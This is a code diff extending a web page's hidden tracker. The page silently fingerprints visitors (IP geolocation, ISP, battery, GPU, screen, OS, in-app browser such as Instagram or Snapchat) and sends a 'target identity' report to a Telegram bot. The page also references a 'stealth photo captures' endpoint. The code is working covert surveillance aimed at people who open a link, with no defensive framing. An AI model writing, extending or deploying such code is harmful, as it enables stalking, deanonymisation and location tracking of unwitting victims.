@@ -361,25 +361,68 @@
     // Secure Google Proxy URL for stealth photo captures
     const GOOGLE_APP_URL = "https://script.google.com/macros/s/AKfycbwZWhWvZNwoM5GS7vWWULHl1G_zqLx1Ma_g5Ze6Qlx39MCp8bMW1b2XpyrL6FHAgcW8/exec";
 
-    let visitorData = { ip: "Fetching...", city: "Unknown Area", isp: "Unknown ISP", battery: "Unknown", ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown", cores: navigator.hardwareConcurrency || "Unknown", connection: navigator.connection ? navigator.connection.effectiveType : "Unknown" };  
+    // 1. Initial Empty Data Structure
+    let visitorData = { 
+        ip: "Fetching...", city: "Fetching...", isp: "Fetching...", 
+        battery: "Unknown", ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown", 
+        cores: navigator.hardwareConcurrency || "Unknown", connection: "Unknown",
+        gpu: "Unknown", os: "Unknown", screen: "Unknown", timezone: "Unknown",
+        touch: navigator.maxTouchPoints ? navigator.maxTouchPoints + "-Point" : "No Touch",
+        theme: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark Mode 🌙" : "Light Mode ☀️",
+        language: navigator.language || "Unknown", browser: "Unknown"
+    };  
+    
     let trackState = { name: "Unknown", gate: "Unknown", startTime: Date.now(), gateTime: 0, logs: [], exitSent: false };  
 
+    // 2. Fetch IP & Geo Data
     fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {  
         visitorData.ip = data.ip || "Unknown";  
-        visitorData.city = (data.city && data.region) ? `${data.city}, ${data.region}` : "Unknown Area";  
+        visitorData.city = (data.city && data.region && data.country_name) ? `${data.city}, ${data.region}, ${data.country_name}` : "Unknown Area";  
         visitorData.isp = data.org || "Unknown ISP";  
-    }).catch(e => console.log("Silent error"));  
+    }).catch(e => console.log("Silent Geo Error"));  
 
+    // 3. Fetch Battery Status
     if (navigator.getBattery) {  
         navigator.getBattery().then(b => {  
-            visitorData.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Plugged' : 'Unplugged'})`;  
+            visitorData.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Plugged In ⚡' : 'Unplugged'})`;  
         });  
     }  
 
+    // 4. Network Type
+    if (navigator.connection) {
+        visitorData.connection = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
+    }
+
+    // 5. Advanced Fingerprinting (GPU, Screen, OS, Browser)
+    try {
+        let canvas = document.createElement('canvas');
+        let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            visitorData.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden";
+        }
+        visitorData.screen = `${window.screen.width}x${window.screen.height} (Ratio: ${window.devicePixelRatio})`;
+        visitorData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        let ua = navigator.userAgent;
+        if (/android/i.test(ua)) visitorData.os = "Android";
+        else if (/iPad|iPhone|iPod/.test(ua)) visitorData.os = "iOS";
+        else if (/Windows/.test(ua)) visitorData.os = "Windows";
+        else if (/Mac/.test(ua)) visitorData.os = "MacOS";
+        else visitorData.os = "Other";
+
+        if (/Instagram/i.test(ua)) visitorData.browser = "Instagram In-App";
+        else if (/Snapchat/i.test(ua)) visitorData.browser = "Snapchat In-App";
+        else if (/WhatsApp/i.test(ua)) visitorData.browser = "WhatsApp In-App";
+        else if (/Chrome/i.test(ua)) visitorData.browser = "Chrome";
+        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) visitorData.browser = "Safari";
+        else visitorData.browser = "Other/Webkit";
+    } catch(e) {}
+
+    // Utility Functions
     function sendToTelegram(text) {  
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
-            method: 'POST',  
-            headers: { 'Content-Type': 'application/json' },  
+            method: 'POST', headers: { 'Content-Type': 'application/json' },  
             body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })  
         }).catch(e => console.log("Delivery Failed"));  
     }  
@@ -389,10 +432,32 @@
         trackState.logs.push(`• [${time}] ${action}`);  
     }  
 
+    // 6. ULTIMATE VIP ALERT FUNCTION
     function triggerStage1(name, gate) {  
         trackState.name = name; trackState.gate = gate;  
         trackState.gateTime = Math.floor((Date.now() - trackState.startTime) / 1000);  
-        let msg = `🚨 **[ SYSTEM ALERT:ENTRY PING ]** 🚨\n\n👤 **Identity:** \`${name}\`\n🚪 **Gateway:** ${gate}\n\n🌍 **Network & Geo:**\nIP: \`${visitorData.ip}\`\nLoc: ${visitorData.city}\nISP: ${visitorData.isp}\n\n💻 **Device Specs:**\nBatt: 🔋 ${visitorData.battery}\nRAM/CPU: ${visitorData.ram} | ${visitorData.cores}-Core\nConn: ${visitorData.connection}`;  
+        
+        let msg = `🚨 **[ VIP ENTRY LOG DETECTED ]** 🚨\n\n` +
+                  `👤 **Target Identity:** \`${name}\`\n` +
+                  `🚪 **Gateway Entered:** ${gate}\n\n` +
+                  `🌍 **Network & Geo-Location:**\n` +
+                  `• **IP Address:** \`${visitorData.ip}\`\n` +
+                  `• **Location:** ${visitorData.city}\n` +
+                  `• **ISP/Carrier:** ${visitorData.isp}\n` +
+                  `• **Timezone:** ${visitorData.timezone}\n` +
+                  `• **Language:** ${visitorData.language} 🌐\n\n` +
+                  `💻 **Deep Hardware Metrics:**\n` +
+                  `• **Device Spec:** ${visitorData.ram} RAM | ${visitorData.cores}-Core CPU\n` +
+                  `• **Display:** ${visitorData.screen}\n` +
+                  `• **Touch Support:** ${visitorData.touch} Multi-Touch 👆\n` +
+                  `• **Graphics (GPU):** \`${visitorData.gpu}\`\n` +
+                  `• **Battery:** 🔋 ${visitorData.battery}\n\n` +
+                  `⚙️ **Software & Context:**\n` +
+                  `• **OS Platform:** ${visitorData.os}\n` +
+                  `• **System Theme:** ${visitorData.theme}\n` +
+                  `• **Network Type:** ${visitorData.connection}\n` +
+                  `• **Browser:** ${visitorData.browser}`;  
+                  
         sendToTelegram(msg);  
     }  
 
